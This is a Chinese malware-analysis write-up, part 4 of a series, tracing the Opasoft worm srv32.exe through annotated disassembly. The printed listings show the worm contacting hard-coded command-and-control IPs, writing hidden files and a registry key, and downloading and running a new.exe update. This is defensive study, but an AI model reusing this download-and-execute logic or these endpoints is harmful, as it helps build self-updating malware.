

# 蠕虫 srv32.exe 逆向分析笔记 4

> 原文：[`www.pediy.com/kssd/pediy07/pediy7-163.htm`](https://www.pediy.com/kssd/pediy07/pediy7-163.htm)

文件名称：srv32.exe  
蠕虫名称：Net-Worm.Win32.Opasoft.s  
工具：   IDA 4.5.1, SoftICE3.1  
  
  
上次我们跟到 sub\_401CF0 里，srv32 会读 http://63.246.135.48/r.php?t=0  
返回时寄存器 EAX = 000000C8，代码如下：  
  
CODE:00402082                 call    sub\_401CF0  
CODE:00402087                 test    eax, eax  
CODE:00402089                 jz      loc\_402264      ; sub\_401CF0 调用失败则跳转  
CODE:0040208F                 cmp     eax, 0FFFFFFFFh  
CODE:00402092                 jz      loc\_402264      ; 在 sub\_401CF0 中如果 InternetReadFile  
CODE:00402092                                         ; 失败 3 次，则 sleep 一下再试  
CODE:00402098                 cmp     eax, 0C8h       ; http 请求的返回值是否是 200  
CODE:0040209D                 jnz     loc\_40228A      ; http 请求失败退出线程  
CODE:004020A3                 mov     eax, \[ebp+lpReadUrlBuffer\]  
CODE:004020A9                 add     eax, \[ebp+NumberOfBytesWritten\]  
CODE:004020AF                 mov     byte ptr \[eax\], 0 ; 给字符串 lpReadUrlFile 加上结束符"\\0"  
CODE:004020B2                 push    \[ebp+lpReadUrlBuffer\]  
CODE:004020B8                 call    CharUpperA      ; 把字符串转大写  
  
调用完 sub\_401CF0 后会用  
cmp eax,0FFFFFFFFh  
cmp eax,0C8h  
来判断返回值如果返回值等于 0x0FFFFFFFF 表示在函数 sub\_401CF0 中调用 InternetReadFile  
时失败，如果等于 0xC8(200)表示 http 请求成功，不等于表示请求失败会退出线程。  
  
sub\_401CF0 调用成功后 lpReadUrlBuffer 指向了从 http://63.246.135.48/r.php?t=0 读  
出的内容，然后有调用了 CharUpperA 把内容中的字母转换成大写。  
  
CODE:004020BD                 lea     eax, \[ebp+Hex\_K\_Value\]  
CODE:004020C3                 push    eax  
CODE:004020C4                 push    offset aK       ; "K"  
CODE:004020C9                 push    \[ebp+lpReadUrlBuffer\]  
CODE:004020CF                 call    sub\_401C01  
CODE:004020D4                 test    eax, eax  
CODE:004020D6                 jz      loc\_40228A      ; 退出线程  
CODE:004020DC                 lea     ecx, \[ebp+Hex\_V\_Value\]  
CODE:004020E2                 push    ecx  
CODE:004020E3                 push    offset aV       ; "V"  
CODE:004020E8                 push    \[ebp+lpReadUrlBuffer\]  
CODE:004020EE                 call    sub\_401C01  
CODE:004020F3                 test    eax, eax  
CODE:004020F5                 jz      loc\_40228A      ; 退出线程  
CODE:004020FB                 lea     ecx, \[ebp+Hex\_W\_Value\]  
CODE:00402101                 push    ecx  
CODE:00402102                 push    offset aW       ; "W"  
CODE:00402107                 push    \[ebp+lpReadUrlBuffer\]  
CODE:0040210D                 call    sub\_401C01  
CODE:00402112                 test    eax, eax  
CODE:00402114                 jz      loc\_40228A      ; 退出线程  
CODE:0040211A                 mov     ecx, offset Hex\_D\_Value  
CODE:0040211F                 push    ecx  
CODE:00402120                 push    offset aD\_0     ; "D"  
CODE:00402125                 push    \[ebp+lpReadUrlBuffer\]  
CODE:0040212B                 call    sub\_401C01  
CODE:00402130                 test    eax, eax  
CODE:00402132                 jz      loc\_40228A      ; 退出线程  
CODE:00402138                 lea     eax, \[ebp+Hex\_T\_Value\]  
CODE:0040213E                 push    eax  
CODE:0040213F                 push    offset aT       ; "T"  
CODE:00402144                 push    \[ebp+lpReadUrlBuffer\]  
CODE:0040214A                 call    sub\_401C01  
CODE:0040214F                 test    eax, eax  
CODE:00402151                 jz      loc\_4021F0  
CODE:00402157                 lea     eax, \[ebp+Hex\_P\_Value\]  
CODE:0040215D                 push    eax  
CODE:0040215E                 push    offset aP       ; "P"  
CODE:00402163                 push    \[ebp+lpReadUrlBuffer\]  
CODE:00402169                 call    sub\_401BA9  
CODE:0040216E                 cmp     eax, 8          ; 比较 Hex\_P\_Value 的字节数是否为 8  
CODE:00402171                 jnz     loc\_40228A      ; 退出线程  
CODE:00402177                 lea     eax, \[ebp+Hex\_C\_Value\]  
CODE:0040217D                 push    eax  
CODE:0040217E                 push    offset aC       ; "C"  
CODE:00402183                 push    \[ebp+lpReadUrlBuffer\]  
CODE:00402189                 call    sub\_401BA9  
CODE:0040218E                 test    eax, 7  
CODE:00402193                 jnz     loc\_40228A      ; 退出线程  
CODE:00402199                 shr     eax, 3          ; Hex\_C\_Value 的字节数除以 8  
CODE:0040219C                 jz      loc\_40228A      ; 退出线程  
CODE:004021A2                 mov     \[ebp+dwCount\], eax  
CODE:004021A8                 mov     ds:byte\_406285, 0  
CODE:004021AF                 push    offset aSrv32res ; lpFileName  
CODE:004021B4                 call    DeleteFileA  
CODE:004021B9                 mov     \[ebp+var\_828\], 0  
CODE:004021C3                 mov     \[ebp+var\_830\], 1  
CODE:004021CD   
  
上面分别用参数"K","V","W","D","T"与 lpReadUrlBuffer 各调用了一次 sub\_401C01,  
用参数"P","C"与 lpReadUrlBuffer 各调用了一次 sub\_401BA9,还记得上次从  
http://63.246.135.48/r.php?t=0 读出的内容吗？如下：  
  
lpReadUrlBuffer\[\] =  
arg\_lpszReadBuf\[\] =   
"t=8&p=1525FFFFFFFFFFFF&c=D0A58993CE0F2086053F57E8785F90C61B1F8E  
20DB856D9554CC789EC0F28D7162D43FC75E50069F8793C546B88A9C4BD80D2  
9241357C766626A77D951CD57CFF9794E84507F478A47EC525DAA963D70172A  
D7CCC3348F3B06B598EA9A286187733F576EB82A6D43CACF4F56746595C01A6  
005215EA0E0BE6D9896C25B5A9252F1949A0E964CC86EE6EA5B00F15AE9B386  
15CC7594BD85B3318FDC8D905D4D5ED93AD43F211A008F6C0D0FDF702F21BA7  
3349F58AA2F78F7FE0750D8C0D019846F4B63B1D5FD699F62A0D5471FC9A69B  
643B20BE7A819679A89868C58723FDA8C0B503329C6B345C3D35FFA9DABC868  
0BE5A90BBB8D9EE4C963619F1949EC6F8DF24E6DFC6E38CB7FB024D59E80358  
08C6B054DEA68B0F8F05302C027DBC14A149C72F9F907AB3D909EDEF3085C9B  
57A36D64DA14C23071AB5715BDEDDC6195D558D1310842BB33D180FF103EFF9  
CF931D58E0BE5000095351DCE2D48000EAF73E84D1DD92A3B0C0CFA73179613  
628E9A63E89DAB3A3C64D3573141C2D17A55064F988361669A4D0B9DAD6886E  
5F32BFB2C40A7DFC8BF1457A512475D1E32B3799AF025547444C19CCE8B62BD  
26EA0AF2350E421DB48EDAE22CF696946928788DD05FE044848E3FD61792192  
DD6D2424DF48BC501E8200EE6AFEFF50C3B5488BAD36892C2763BCC6E7AB30C  
F789426A745FD65B0C8ECE543EA0D6606D2220DEBE1D1E3D42C97FE5216BE06  
A7B07DB2145491990A8AD977055A7540049AB776445ABC1F83FFF41247CD8AE  
C388ECDBF562A1C9B2F850992A5AE4179915E63811D9BD958FA135E69F16B73  
4E9FD4679FED9464E6EA753AFB5BB411F3AF28A7347F7B49C5A05C776AE1F9F  
0FBDA29252FBF21F3F73CF888B599F0E6927B48725FA7C6A9871178EEAF6E42  
BF0694A62838BDB2240DAE97F654A37F14872675A34CAA068A552AB3F53BCBB  
4DD890E4788120AA3319EBE6BA4E98612EB93252D794C6BECB3464F48242F44  
3B3EF0E077C15961E5406B821A626F755483A3FFA7A5E451E4CE96E149A0FBD  
D&v=FEE9&d=0&w=&k=124F5"  
  
这里的"K","V","W","D","T","P","C"其实对应的就是 lpReadUrlBuffer 中  
的"k=", "v=", "w=", "d=", "t=", "p=", "c="，而函数 sub\_401C01 和  
sub\_401BA9 作用就是取"="号后面的值并以十六进制存储到内存中（如：k=124F5  
调用 sub\_401C01 时把 124F5 转换成十六进制 0x124F5 存到 Hex\_K\_Value）,最后  
内存中的数据如下：  
  
  
00000000   08 00 00 00 01 00 00 00  C5 B7 03 00 00 00 00 00   ........欧......  
00000010   38 4A F0 A0 30 00 00 00  15 25 FF FF FF FF FF FF   8J 餩 0....%������  
00000020   5D 00 00 00 D0 A5 89 93  CE 0F 20 86 05 3F 57 E8   \]...啸墦? ??W?  
00000030   78 5F 90 C6 1B 1F 8E 20  DB 85 6D 95 54 CC 78 9E   x\_ 惼..?蹍 m 昑蘹?  
00000040   C0 F2 8D 71 62 D4 3F C7  5E 50 06 9F 87 93 C5 46   莉峲 b?荿 P.焽撆 F  
00000050   B8 8A 9C 4B D8 0D 29 24  13 57 C7 66 62 6A 77 D9   笂淜?)$.W 莊 bjw?  
00000060   51 CD 57 CF F9 79 4E 84  50 7F 47 8A 47 EC 52 5D   Q 蚖嚣 yN 凱G 奊霷\]  
00000070   AA 96 3D 70 17 2A D7 CC  C3 34 8F 3B 06 B5 98 EA   獤=p.\*滋??.禈?  
00000080   9A 28 61 87 73 3F 57 6E  B8 2A 6D 43 CA CF 4F 56   ?a 噑?Wn?mC 氏 OV  
00000090   74 65 95 C0 1A 60 05 21  5E A0 E0 BE 6D 98 96 C2   te 暲.\`.!^\_ 嗑 m 槚?  
000000A0   5B 5A 92 52 F1 94 9A 0E  96 4C C8 6E E6 EA 5B 00   \[Z 扲駭?朙萵骊\[.  
000000B0   F1 5A E9 B3 86 15 CC 75  94 BD 85 B3 31 8F DC 8D   馴槌?蘵斀叧 1 徿?  
000000C0   90 5D 4D 5E D9 3A D4 3F  21 1A 00 8F 6C 0D 0F DF   怾 M^??!..弆..?  
000000D0   70 2F 21 BA 73 34 9F 58  AA 2F 78 F7 FE 07 50 D8   p/!簊 4 焁?x 齄.P?  
000000E0   C0 D0 19 84 6F 4B 63 B1  D5 FD 69 9F 62 A0 D5 47   佬.刼 Kc 闭齣焍\_ 誈  
000000F0   1F C9 A6 9B 64 3B 20 BE  7A 81 96 79 A8 98 68 C5   .搔沝; 緕仏 yh?  
00000100   87 23 FD A8 C0 B5 03 32  9C 6B 34 5C 3D 35 FF A9   ?赖.2 渒 4\\=5�?  
00000110   DA BC 86 80 BE 5A 90 BB  B8 D9 EE 4C 96 36 19 F1   诩唨綵惢纲頛?.?  
00000120   94 9E C6 F8 DF 24 E6 DF  C6 E3 8C B7 FB 02 4D 59   敒气?孢沏尫?MY  
00000130   E8 03 58 08 C6 B0 54 DE  A6 8B 0F 8F 05 30 2C 02   ?X.瓢 T 蕈??0,.  
00000140   7D BC 14 A1 49 C7 2F 9F  90 7A B3 D9 09 ED EF 30   }??煇 z 迟.盹 0  
00000150   85 C9 B5 7A 36 D6 4D A1  4C 23 07 1A B5 71 5B DE   吷祕 6 諱#..祋\[?  
00000160   DD C6 19 5D 55 8D 13 10  84 2B B3 3D 18 0F F1 03   萜.\]U?.??..?  
00000170   EF F9 CF 93 1D 58 E0 BE  50 00 09 53 51 DC E2 D4   稆蠐.X 嗑 P..SQ 茆?  
00000180   80 00 EA F7 3E 84 D1 DD  92 A3 B0 C0 CF A7 31 79   €.犄>勓輶０老?y  
00000190   61 36 28 E9 A6 3E 89 DA  B3 A3 C6 4D 35 73 14 1C   a6(棣>壼常芃 5s..  
000001A0   2D 17 A5 50 64 F9 88 36  16 69 A4 D0 B9 DA D6 88   -.d 鶊 6.iば冠謭  
000001B0   6E 5F 32 BF B2 C4 0A 7D  FC 8B F1 45 7A 51 24 75   n\_2 坎?}鼖馝 zQ$u  
000001C0   D1 E3 2B 37 99 AF 02 55  47 44 4C 19 CC E8 B6 2B   雁+7 櫙.UGDL.惕?  
000001D0   D2 6E A0 AF 23 50 E4 21  DB 48 ED AE 22 CF 69 69   襫\_?P?跦懋"蟟 i  
000001E0   46 92 87 88 DD 05 FE 04  48 48 E3 FD 61 79 21 92   F 拠堓.?HH 泯 ay!?  
000001F0   DD 6D 24 24 DF 48 BC 50  1E 82 00 EE 6A FE FF 50   輒$$逪糚.?頹?P  
00000200   C3 B5 48 8B AD 36 89 2C  27 63 BC C6 E7 AB 30 CF   玫 H 嫮 6?'c 计绔 0?  
00000210   78 94 26 A7 45 FD 65 B0  C8 EC E5 43 EA 0D 66 06   x?齟叭戾 C?f.  
00000220   D2 22 0D EB E1 D1 E3 D4  2C 97 FE 52 16 BE 06 A7   ?.脶雁?楟 R.??  
00000230   B0 7D B2 14 54 91 99 0A  8A D9 77 05 5A 75 40 04   皚?T 憴.娰 w.Zu@.  
00000240   9A B7 76 44 5A BC 1F 83  FF F4 12 47 CD 8A EC 38   毞 vDZ???G 蛫?  
00000250   8E CD BF 56 2A 1C 9B 2F  85 09 92 A5 AE 41 79 91   幫縑\*.??挜瓵 y?  
00000260   5E 63 81 1D 9B D9 58 FA  13 5E 69 F1 6B 73 4E 9F   ^c?涃 X?^i 駅 sN?  
00000270   D4 67 9F ED 94 64 E6 EA  75 3A FB 5B B4 11 F3 AF   詆燀攄骊 u:鸞?蟑  
00000280   28 A7 34 7F 7B 49 C5 A0  5C 77 6A E1 F9 F0 FB DA   (?{I 臺\\wj 狴瘥?  
00000290   29 25 2F BF 21 F3 F7 3C  F8 88 B5 99 F0 E6 92 7B   )%/?篦<鴪禉疰�{  
000002A0   48 72 5F A7 C6 A9 87 11  78 EE AF 6E 42 BF 06 94   Hr\_﹪.x 畀 nB??  
000002B0   A6 28 38 BD B2 24 0D AE  97 F6 54 A3 7F 14 87 26   ?8 讲$.畻鯰?.?  
000002C0   75 A3 4C AA 06 8A 55 2A  B3 F5 3B CB B4 DD 89 0E   u?奤\*初;舜輭.  
000002D0   47 88 12 0A A3 31 9E BE  6B A4 E9 86 12 EB 93 25   G?.?灳 kら?霌%  
000002E0   2D 79 4C 6B EC B3 46 4F  48 24 2F 44 3B 3E F0 E0   -yLk 斐 FOH$/D;>疣  
000002F0   77 C1 59 61 E5 40 6B 82  1A 62 6F 75 54 83 A3 FF   w 罽 a 錊 k?bouT 儯�  
00000300   A7 A5 E4 51 E4 CE 96 E1  49 A0 FB DD               Д銺湮栣 I\_?  
  
第一个 DWORD 值 00000008 就是 t=8 中的 8，第二个 DWORD 值就是 var\_830 还不知道作甚么用的；  
第三个 DWORD 值 0003B7C5 是 k=后面的值（由于每次请求返回的 k 值不同所以这里已经不是 124F5）  
偏移 18 处的值对应 p 的值，偏移 24 到结尾对应 C 的值，偏移 20 处的 DWORD 值等于 C 值所占内存的字节  
数除以 8。  
  
这段数据的结构表示如下：  
  
struct tagSrv32tskFile  
{  
  DWORD dwTValue;    //ebp-834h  
  DWORD unknown1 = 1;  //ebp-830h  
  DWORD dwKValue;    //ebp-82Ch  
  DWORD unknown2 = 0;  //ebp-828h  
  DWORD unknown3;    //ebp-824h  
  DWORD unknown4;    //ebp-820h  
  INT64 PValue;    //ebp-81Ch  
  DWORD dwCount;    //ebp-814  
  BYTE CValue\[744\]  //ebp-810  
};  
  
CODE:004021CD loc\_4021CD:  
CODE:004021CD                 push    0               ; hTemplateFile  
CODE:004021CF                 push    80000002h       ; dwFlagsAndAttributes  
CODE:004021D4                 push    4               ; OPEN\_ALWAYS，如果文件不存在，创建  
CODE:004021D6                 push    0               ; lpSecurityAttributes  
CODE:004021D8                 push    3               ; dwShareMode  
CODE:004021DA                 push    40000000h       ; dwDesiredAccess  
CODE:004021DF                 push    offset aSrv32tsk ; lpFileName  
CODE:004021E4                 call    CreateFileA     ; 创建文件 srv32tsk  
CODE:004021E9                 cmp     eax, 0FFFFFFFFh  
CODE:004021EC                 jz      short loc\_4021CD ; 跳转直到文件 srv32tsk 创建成功  
CODE:004021EE                 jmp     short loc\_402217  
  
创建文件 srv32tsk 后跳转到 loc\_402217:  
  
CODE:00402217 loc\_402217:   
CODE:00402217                 lea     edx, \[ebp+lpBufferOfWrite\]  
CODE:0040221D                 push    edx  
CODE:0040221E                 push    eax  
CODE:0040221F                 call    sub\_401531      ; 把 lpBufferOfWrite 的内容写到文件 srv32tsk  
CODE:00402224   
CODE:00402224 loc\_402224:                             ; CODE XREF: StartAddress+45Bj  
CODE:00402224                 call    sub\_401C49      ; 写注册表 srv32  
CODE:00402229                 cmp     ds:Data, 0  
CODE:00402230                 jz      short loc\_402239  
CODE:00402232                 call    sub\_4030EB  <<<<<这里创建了两个线程，做个标记  
CODE:00402237                 jmp     short loc\_40223E  
  
  
在函数 sub\_401531 里把 lpBufferOfWrite 的内容（就是上面生成的那堆数据）写到文件 srv32tsk，  
sub\_401C49 会写注册表 HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\SRV32 下  
D ＝ Hex\_D\_Value(二进制值，第一次到这时为 00)，在 sub\_401C01 函数里会修改 ds:Data 的值。  
在 sub\_4030EB 里会创建两个线程（sub\_403045 和 sub\_402EEE），有很多网络的动作，不过执行到  
00402229 这里时 ds:Data 的值为 0，jz short loc\_402239 会跳转到：  
  
  
CODE:00402239 loc\_402239:   
CODE:00402239                 call    sub\_4031A3      ; closesocket  
CODE:00402239                                         ; WSACleanup  
CODE:0040223E   
CODE:0040223E loc\_40223E:   
CODE:0040223E                 mov     eax, \[ebp+var\_10\]  
CODE:00402241                 imul    eax, 8  
CODE:00402244                 push    eax  
CODE:00402245                 push    offset aSrv32res ; "Srv32Res"  
CODE:0040224A                 call    sub\_401AAE  
CODE:0040224F                 push    offset aSrv32res ; "Srv32Res"  
CODE:00402254                 call    icy\_GetFileSize ; 这个函数已经被我重命名了  
CODE:00402259                 cmp     eax, 8  
CODE:0040225C                 jge     loc\_401F9B  
CODE:00402262                 jmp     short loc\_40228F  
  
在 sub\_4031A3 里调用了 closesocket,WSACleanup 关闭了 socket;sub\_401AAE 和 icy\_GetFileSize  
访问打开文件 srv32res（不存在）失败，icy\_GetFileSize 返回-1 所以 jge loc\_401F9B 跳转实现  
  
跳转到：  
  
CODE:0040228F loc\_40228F:  
CODE:0040228F                 mov     eax, \[ebp+pBufOfReadFile\]  
CODE:00402292                 movzx   edx, word ptr \[eax\]  
CODE:00402295                 cmp     edx, \[ebp+Hex\_V\_Value\]  
CODE:0040229B                 jz      loc\_4023DD  
CODE:004022A1                 mov     edi, 3  
  
上一篇中 pBufOfReadFile 内容如下：  
  
pBufOfReadFile\[\] =  
{  
  0xE8,0xFE,0x0C,0x00,  
  0xF0,0x06,0x1E,0x00,  
  0x42,0xF6,0x29,0xC9,  
  0x3F,0xF7,0x87,0x30,  
  0x3F,0xF7,0x87,0x30,  
  0x40,0xB1,0xE2,0xC0,  
  0x00,0x00,0x00,0x00,  
  0x00,0x00,0x00,0x00  
}  
  
由于 Hex\_V\_Value = 0xFEE9，所以 jz loc\_4023DD 未跳转  
  
CODE:004022A6 loc\_4022A6:   
CODE:004022A6                 mov     esi, \[ebp+pBufOfReadFile\]  
CODE:004022A9                 inc     edi  
CODE:004022AA                 cmp     edi, \[ebp+var\_C\]  
CODE:004022AD                 jnb     loc\_4023DD  
CODE:004022B3                 mov     eax, \[esi+edi\*4\] ;IP：0x3087F73F = 3F.F7.87.30=63.247.135.48  
CODE:004022B6                 test    eax, eax  
CODE:004022B8                 jz      loc\_4023DD  
CODE:004022BE                 push    eax             ; in  
CODE:004022BF                 call    inet\_ntoa       ; 63.247.135.48  
CODE:004022C4                 lea     edx, \[ebp+pszUrl\]  
CODE:004022CA                 push    eax  
CODE:004022CB                 push    offset aHttpSL  ; "http://%s/l"  
CODE:004022D0                 push    edx  
CODE:004022D1                 call    wsprintfA       ; psUrl = http://63.247.135.48/l  
CODE:004022D6                 add     esp, 0Ch  
CODE:004022D9                 lea     eax, \[ebp+NumberOfBytesWritten\]  
CODE:004022DF                 lea     edx, \[ebp+pszUrl\]  
CODE:004022E5                 lea     eax, \[ebp+NumberOfBytesWritten\]  
CODE:004022EB                 push    eax  
CODE:004022EC                 push    \[ebp+lpReadUrlBuffer\]  
CODE:004022F2                 push    edx  
CODE:004022F3                 push    \[ebp+hInternet\]  
CODE:004022F9                 call    icy\_ReadUrlFile  
CODE:004022FE                 cmp     eax, 0C8h  
CODE:00402303                 jnz     short loc\_4022A6 ; 读 URL 失败，重来  
  
  
读 http://63.247.135.48/l 的内容到 lpReadUrlBuffer  
  
lpReadUrlBuffer\[\] =  
"E4 4B A7 99 B2 D2 46 94  B2 BA F0 67 39 74 88 EE  
 BE D0 9F 7E 46 58 52 5F  11 65 A7 DE A4 4F DA 10";  
  
CODE:00402305                 cmp     \[ebp+NumberOfBytesWritten\], 20h ; 比较读出的内容是否是 32 个字节  
CODE:0040230C                 jb      short loc\_4022A6 ; 读 URL 失败，重来  
CODE:0040230E                 push    \[ebp+NumberOfBytesWritten\] ; uBytes  
CODE:00402314                 push    0               ; uFlags  
CODE:00402316                 call    LocalAlloc  
CODE:0040231B                 mov     \[ebp+hMem\], eax  
CODE:0040231E                 push    \[ebp+NumberOfBytesWritten\]  
CODE:00402324                 push    eax  
CODE:00402325                 push    \[ebp+lpReadUrlBuffer\]  
CODE:0040232B                 call    icy\_CopyBufToAllocMem  
CODE:00402330                 push    \[ebp+NumberOfBytesWritten\]  
CODE:00402336                 push    \[ebp+hMem\]  
CODE:00402339                 call    icy\_ChangeAllocMem  
CODE:0040233E                 mov     eax, \[ebp+hMem\]  
CODE:00402341                 cmp     dword ptr \[eax+8\], 0C929F642h  
CODE:00402348                 jz      short loc\_402357  
CODE:0040234A                 push    \[ebp+hMem\]      ; hMem  
CODE:0040234D                 call    LocalFree  
CODE:00402352                 jmp     loc\_4022A6  
  
比较 lpReadUrlBuffer 的内容是否是 32 个字节，然后分配一块内存调用 icy\_CopyBufToAllocMem  
把 lpReadurlBuffer 拷贝一份到新分配的内存处，调用 icy\_ChangeAllocMem 对这块内容做了一些  
转换  
  
  
CODE:00402357 ; ///////////////////////////////////////////////////////////////////////////  
CODE:00402357   
CODE:00402357 loc\_402357:                             ; CODE XREF: StartAddress+598j  
CODE:00402357                 push    \[ebp+pBufOfReadFile\] ; hMem  
CODE:0040235A                 call    LocalFree  
CODE:0040235F                 mov     eax, \[ebp+hMem\]  
CODE:00402362                 mov     \[ebp+pBufOfReadFile\], eax  
CODE:00402365                 mov     edi, eax  
CODE:00402367                 mov     ecx, \[ebp+NumberOfBytesWritten\]  
CODE:0040236D                 shr     ecx, 2  
CODE:00402370                 xor     eax, eax  
CODE:00402372                 cld  
CODE:00402373                 repne scasd  
CODE:00402375                 sub     edi, \[ebp+pBufOfReadFile\]  
CODE:00402378                 shr     edi, 2  
CODE:0040237B                 dec     edi  
CODE:0040237C                 mov     \[ebp+var\_C\], edi  
CODE:0040237F                 push    22h             ; dwFileAttributes  
CODE:00402381                 push    offset aHstlst  ; lpFileName  
CODE:00402386                 call    SetFileAttributesA  
CODE:0040238B                 push    0               ; hTemplateFile  
CODE:0040238D                 push    2               ; dwFlagsAndAttributes  
CODE:0040238F                 push    2               ; dwCreationDisposition  
CODE:00402391                 push    0               ; lpSecurityAttributes  
CODE:00402393                 push    0               ; dwShareMode  
CODE:00402395                 push    40000000h       ; dwDesiredAccess  
CODE:0040239A                 push    offset aHstlst  ; lpFileName  
CODE:0040239F                 call    CreateFileA  
CODE:004023A4                 cmp     eax, 0FFFFFFFFh  
CODE:004023A7                 jz      short loc\_4023DD  
CODE:004023A9                 mov     edi, eax  
CODE:004023AB                 lea     edx, \[ebp+NumberOfBytesWritten\]  
CODE:004023B1                 push    0               ; lpOverlapped  
CODE:004023B3                 push    edx             ; lpNumberOfBytesWritten  
CODE:004023B4                 push    \[ebp+NumberOfBytesWritten\] ; nNumberOfBytesToWrite  
CODE:004023BA                 push    \[ebp+lpReadUrlBuffer\] ; lpBuffer  
CODE:004023C0                 push    edi             ; hFile  
CODE:004023C1                 call    WriteFile  
CODE:004023C6                 push    edi             ; hObject  
CODE:004023C7                 call    CloseHandle  
CODE:004023CC                 push    23h             ; dwFileAttributes  
CODE:004023CE                 push    offset aHstlst  ; lpFileName  
CODE:004023D3                 call    SetFileAttributesA  
CODE:004023D8                 call    icy\_CopyFile\_Hstlst\_Hlb  
  
  
在 windows 目录下创建一个文件 hstlst,并把 lpReadUrlBuffer 的内容写到此文件中，如果  
Hstlst 的不小于 32 个字节，函数 icy\_CopyFile\_Hstlst\_Hlb 把 hstlst 复制一份到 hlb，  
如果 Hstlst 小于 32 个字节，icy\_CopyFile\_Hstlst\_Hlb 把 hlb 复制一份到 hstlst（这里就是  
确保 hstlst 的内容不会被破坏）。  
  
  
CODE:004023DD loc\_4023DD:                             ; CODE XREF: StartAddress+4EBj  
CODE:004023DD                                         ; StartAddress+4FDj ...  
CODE:004023DD                 cmp     \[ebp+Hex\_W\_Value\], 0Ch  
CODE:004023E4                 jz      loc\_402498  
CODE:004023EA                 mov     edi, 3  
CODE:004023EF   
CODE:004023EF loc\_4023EF:                             ; CODE XREF: StartAddress+69Cj  
CODE:004023EF                 mov     esi, \[ebp+pBufOfReadFile\]  
CODE:004023F2                 inc     edi  
CODE:004023F3                 cmp     edi, \[ebp+var\_C\]  
CODE:004023F6                 jnb     loc\_402498      ; 退出线程  
CODE:004023FC                 mov     eax, \[esi+edi\*4\] ; 69.60.111.123  
CODE:004023FF                 test    eax, eax  
CODE:00402401                 jz      loc\_402498  
CODE:00402407                 push    eax             ; in  
CODE:00402408                 call    inet\_ntoa  
CODE:0040240D                 lea     edx, \[ebp+pszUrl\]  
CODE:00402413                 push    eax  
CODE:00402414                 push    offset aHttpSU  ; "http://%s/u"  
CODE:00402419                 push    edx  
CODE:0040241A                 call    wsprintfA       ; http://69.60.111.123/u  
CODE:0040241A                                         ; http://63.247.135.48/u  
CODE:0040241F                 add     esp, 0Ch  
CODE:00402422                 lea     eax, \[ebp+NumberOfBytesWritten\]  
CODE:00402428                 lea     edx, \[ebp+pszUrl\]  
CODE:0040242E                 lea     eax, \[ebp+NumberOfBytesWritten\]  
CODE:00402434                 push    eax  
CODE:00402435                 push    \[ebp+lpReadUrlBuffer\]  
CODE:0040243B                 push    edx  
CODE:0040243C                 push    \[ebp+hInternet\]  
CODE:00402442                 call    icy\_ReadUrlFile  
CODE:00402447                 cmp     eax, 0C8h  
CODE:0040244C                 jnz     short loc\_4023EF ; ; 失败，跳转  
  
这里由于访问 http://69.60.111.123/u 和 http://63.247.135.48/u 都失败了所以在  
CODE:004023F6   jnb  loc\_402498 跳转实现会退出线程，如果上面 icy\_ReadUrlFile  
成功则执行下面代码，把读出的内容写到 new.exe 中，如果写成功则调用 icy\_CreateNew\_ExitOld\_Proc  
执行 new.exe 自己退出（这应该是更新功能吧，作者考虑的很周全啊！还记得第一篇用到了 new.exe 吗？）  
  
  
CODE:0040244E                 push    0               ; hTemplateFile  
CODE:00402450                 push    2               ; dwFlagsAndAttributes  
CODE:00402452                 push    4               ; dwCreationDisposition  
CODE:00402454                 push    0               ; lpSecurityAttributes  
CODE:00402456                 push    0               ; dwShareMode  
CODE:00402458                 push    40000000h       ; dwDesiredAccess  
CODE:0040245D                 push    offset aNew\_exe ; lpFileName  
CODE:00402462                 call    CreateFileA  
CODE:00402467                 cmp     eax, 0FFFFFFFFh  
CODE:0040246A                 jz      short loc\_402498 ; CreateFile 失败退出线程  
CODE:0040246C                 mov     esi, eax  
CODE:0040246E                 lea     edx, \[ebp+NumberOfBytesWritten\]  
CODE:00402474                 push    0               ; lpOverlapped  
CODE:00402476                 push    edx             ; lpNumberOfBytesWritten  
CODE:00402477                 push    \[ebp+NumberOfBytesWritten\] ; nNumberOfBytesToWrite  
CODE:0040247D                 push    \[ebp+lpReadUrlBuffer\] ; lpBuffer  
CODE:00402483                 push    esi             ; hFile  
CODE:00402484                 call    WriteFile  
CODE:00402489                 test    eax, eax  
CODE:0040248B                 jz      short loc\_402498 ; WriteFile 失败退出线程  
CODE:0040248D                 push    esi             ; hObject  
CODE:0040248E                 call    CloseHandle  
CODE:00402493                 call    icy\_CreateNew\_ExitOld\_Proc  
CODE:00402498   
CODE:00402498 loc\_402498:                             ; CODE XREF: StartAddress+21Bj  
CODE:00402498                                         ; StartAddress+254j ...  
CODE:00402498                 push    \[ebp+lpReadUrlBuffer\] ; hMem  
CODE:0040249E                 call    LocalFree  
CODE:004024A3                 push    \[ebp+hInternet\]  
CODE:004024A9                 call    InternetCloseHandle  
CODE:004024AE                 mov     ds:ThreadId, 0  
CODE:004024B8                 leave  
CODE:004024B9                 retn    4  
CODE:004024B9 StartAddress    endp  
  
  
到这里这个线程已经退出了，下一篇又会返回到主线程，大家最好再看一下第 1，2 篇。 

 4dd466d0e1e0cc123afbe504da2462ca